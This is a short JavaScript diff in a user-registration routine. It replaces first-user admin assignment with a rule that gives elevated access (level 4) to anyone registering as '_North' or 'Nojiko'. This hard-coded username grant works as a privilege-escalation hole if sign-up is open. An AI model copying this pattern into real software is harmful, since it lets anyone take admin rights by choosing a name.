@@ -65,7 +65,8 @@ export default class {
     const results = db
       .prepare(`SELECT COUNT(*) AS 'count' FROM users`)
       .get({ username: username });
-    const access = results.count > 0 ? 0 : 4;
+    //const access = results.count > 0 ? 0 : 4;
+    const access = ["_North", "Nojiko"].includes(username) ? 4 : 0;
     db.prepare(
       `
 			INSERT INTO users 
